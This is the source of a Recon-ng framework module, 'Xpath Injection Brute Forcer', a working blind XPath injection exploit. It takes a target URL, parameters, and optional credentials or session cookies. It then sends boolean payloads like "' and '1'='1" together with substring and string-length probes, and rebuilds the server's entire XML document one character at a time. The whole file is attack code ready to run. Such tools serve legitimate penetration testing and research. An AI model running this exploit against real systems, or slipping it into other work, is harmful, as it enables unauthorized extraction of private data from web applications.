from recon.core.module import BaseModule
from urllib.parse import unquote_plus

class Module(BaseModule):

    meta = {
        'name': 'Xpath Injection Brute Forcer',
        'author': 'Tim Tomes (@lanmaster53) & Justin Timko (@soloxdead)',
        'version': '1.2',
        'description': 'Exploits XPath injection flaws to enumerate the contents of serverside XML documents.',
        'options': (
            ('base_url', None, True, 'target resource url excluding any parameters'),
            ('basic_user', None, False, 'username for basic authentication'),
            ('basic_pass', None, False, 'password for basic authentication'),
            ('cookie', None, False, 'cookie string containing authenticated session data'),
            ('parameters', None, True, 'query parameters with \'<inject>\' signifying the injection'),
            ('post', False, True, 'set the request method to POST'),
            ('string', None, True, 'unique string found when the injection results in \'True\''),
        ),
    }

    def getRequest(self, strTest):
        payload = {}
        for param in self.lstParams:
            payload[param[0]] = param[1].replace('<inject>', strTest)
        kwargs = {
            'headers': self.dictHeaders,
            'auth': self.tupAuth,
        }
        if self.strMethod == 'GET':
            kwargs['params'] = payload
        else:
            kwargs['data'] = payload
        # send the request
        resp = self.request(self.strMethod, self.strUrl, **kwargs)
        # process the response
        self.intCount += 1
        if self.strSearch in resp.text:
            return True
        else:
            return False

    def getLength(self, strTest):
        intLength = 0
        for x in range(0,10000):
            if self.getRequest(strTest % x):
                return x

    def getString(self, intLength, strTest):
        strResult = ''
        for x in range(1, intLength+1):
            found = False
            for char in self.strCharset:
                if self.getRequest(strTest % (x, char)):
                    strResult += char
                    print(char, end='')
                    found = True
                    break
            if not found:
                strResult += '?'
                print('?', end='')
        return strResult

    def checkItem(self, strItem, lstItems):
        for item in getattr(self, lstItems):
            if self.getRequest(f"' and name({strItem})='{item}"):
                return item

    def getAttribs(self, node):
        intAttribs = self.getLength(f"' and count({node}/@*)=%d and '1'='1")
        for x in range(1,intAttribs+1):
            strAttrib = f"{node}/@*[{x}]"
            print(' ', end='')
            # check if attrib matches previously enumerated attrib
            name = self.checkItem(strAttrib, 'attribs')
            if name:
                print(name, end='')
            else:
                # length of attrib name
                intNamelen = self.getLength(f"' and string-length(name({strAttrib}))=%d and '1'='1")
                # attrib name
                name = self.getString(intNamelen, f"' and substring(name({strAttrib}),%d,1)='%s' and '1'='1")
                self.attribs.append(name)
            # length of attrib value
            intValuelen = self.getLength(f"' and string-length({strAttrib})=%d and '1'='1")
            # attrib value
            print('="', end='')
            value = self.getString(intValuelen, f"' and substring({strAttrib},%d,1)='%s' and '1'='1")
            print('"', end='')

    def getXML(self, node='', name='', level=0):
        spacer = '   '*level
        intNodes = self.getLength(f"' and count({node}/*)=%d and '1'='1")
        if not intNodes:
            # check for value
            intValuelen = self.getLength(f"' and string-length({node})=%d and '1'='1")
            if intValuelen:
                print('>', end='')
                value = self.getString(intValuelen, f"' and substring({node},%d,1)='%s' and '1'='1")
                print(f"</{name}>")
            else:
                print('/>')
            return True
        if level != 0: print('>')
        for x in range(1,intNodes+1):
            strNode = f"{node}/*[{x}]"
            print(f"{spacer}<", end='')
            # check if node matches previously enumerated node
            name = self.checkItem(strNode, 'nodes')
            if name:
                print(name, end='')
            else:
                # length of node name
                intNamelen = self.getLength(f"' and string-length(name({strNode}))=%d and '1'='1")
                # node name
                name = self.getString(intNamelen, f"' and substring(name({strNode}),%d,1)='%s' and '1'='1")
                self.nodes.append(name)
            self.getAttribs(strNode)
            if not self.getXML(strNode, name, level + 1):
                print(f"{spacer}</{name}>")

    def module_run(self):
        self.strSearch = self.options['string']
        self.strUrl = self.options['base_url']
        self.strCharset = r'aeorisn1tl2md0cp3hbuk45g9687yfwjvzxqASERBTMLNPOIDCHGKFJUW.!Y*@V-ZQX_$#,/+?;^ %~=&`\)][:<(>"|{\'}'
        self.intCount = 0
        self.nodes = []
        self.attribs = []
        strTrue = "' and '1'='1"
        strFalse = "' and '1'='2"

        # process parameters
        params = self.options['parameters']
        params = params.split('&')
        params = [param.split('=') for param in params]
        self.lstParams = [(unquote_plus(param[0]), unquote_plus(param[1])) for param in params]

        # process basic authentication
        username = self.options['basic_user']
        password = self.options['basic_pass']
        self.tupAuth = (username, password) if username and password else ()

        # process cookie authentication
        cookie = self.options['cookie']
        self.dictHeaders = {'Cookie': cookie} if cookie else {}

        # set the request method
        self.strMethod = 'POST' if self.options['post'] else 'GET'
        self.verbose(f"'True' injection payload: =>{strTrue}<=")
        if self.getRequest(strTrue):
            self.alert("'True' injection test passed.")
        else:
            self.error("'True' injection test failed.")
            return

        self.verbose(f"'False' injection payload: =>{strFalse}<=")
        if not self.getRequest(strFalse):
            self.alert("'False' injection test passed.")
        else:
            self.error("'False' injection test failed.")
            return

        self.output('Fetching XML...')
        self.getXML()
        self.output(f"{self.intCount} total queries made.")
